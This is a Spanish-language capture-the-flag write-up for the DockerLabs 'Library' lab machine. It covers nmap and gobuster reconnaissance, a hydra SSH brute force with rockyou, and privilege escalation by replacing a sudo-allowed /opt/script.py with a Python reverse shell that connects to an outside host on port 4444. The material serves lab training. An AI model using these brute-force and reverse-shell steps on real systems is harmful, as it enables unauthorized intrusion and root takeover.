# Write-up: Library

**Sitio: DockerLabs**  
**Dificultad: Fácil**    
**Fecha: 14/07/2025**  
**Aprendizaje:**  
  
    • Refuerzo en comandos para escaneos.  
    • Refuerzo en creación y adaptación de script para explotación.  

---

## 1 - Escaneo del objetivo:

 > sudo nmap -p- -sSV -O --open --min-rate 5000 -vvv -n -Pn 172.17.0.2

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
```
**OS**: `Linux`

---

## 2 - Escaneo de servicios específicos y reconocimiento:

> • sudo nmap -p 22,88 -sC 172.17.0.2:

```
PORT   STATE  SERVICE
22/tcp open   ssh
| ssh-hostkey: 
|   256 f9:f6:fc:f7:f8:4d:d4:74:51:4c:88:23:54:a0:b3:af (ECDSA)
|_  256 fd:5b:01:b6:d2:18:ae:a3:6f:26:b2:3c:00:e5:12:c1 (ED25519)
88/tcp closed kerberos-sec
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

> • gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -q -b 404,403

```
/index.php            (Status: 200) [Size: 26]
/index.html           (Status: 200) [Size: 10671]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
```

**/index.php** => tira `JIFGHDS87GYDFIGD`

> • hydra -L /usr/share/wordlists/rockyou.txt -p JIFGHDS87GYDFIGD -V -f ssh://172.17.0.2

`-f` => para que corte cuando encuentre la coincidencia.

`user: carlos`

---

## 3 - Una vez dentro, se listaron binarios con permisos elevados:

> • sudo -l

`(ALL) NOPASSWD: /usr/bin/python3 /opt/script.py`

---

## 4 - Analizo el script:

```
import shutil

def copiar_archivo(origen, destino):
    shutil.copy(origen, destino)
    print(f'Archivo copiado de {origen} a {destino}')

if __name__ == '__main__':
    origen = '/opt/script.py'
    destino = '/tmp/script_backup.py'
    copiar_archivo(origen, destino)
```

---

## 5 - Veo que el script no tiene nada relevante para explotar de forma SENCILLA y RÁPIDA por lo que opto:

> • ls -la => veo mis permisos

```
total 32
drwxr-x--- 1 carlos carlos 4096 Jul 14 03:14 . => tengo permiso de escritura/lectura/ejecución en mi directorio actual.
drwxr-xr-x 1 root   root   4096 May  7  2024 ..
-rw-r--r-- 1 carlos carlos  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 carlos carlos 3771 Mar 31  2024 .bashrc
drwx------ 2 carlos carlos 4096 Jul 14 02:57 .cache
drwxrwxr-x 3 carlos carlos 4096 Jul 14 03:14 .local
-rw-r--r-- 1 carlos carlos  807 Mar 31  2024 .profile
```

> • Me creo un script con el mismo nombre que el script que se ejecuta en el directorio opt: script.py

a - `nano script.py`

b - De payload, al estar siendo apuntado por el binario de python3, usando la página `tex2e.github.io` me creo la reverse shell y solo agrego allí dentro el payload que será ejecutado por el binario de python3.

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.146.132",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
c - `mv script.py /opt` => me pide confirmación y se la doy.

d - En otra terminal pongo el listener a escuchar => `nc -lvnp 4444`

e - `sudo /usr/bin/python3 /opt/script.py`

f - Me dirijo a la otra terminal con el listener escuchando.

> g - whoami = `root`
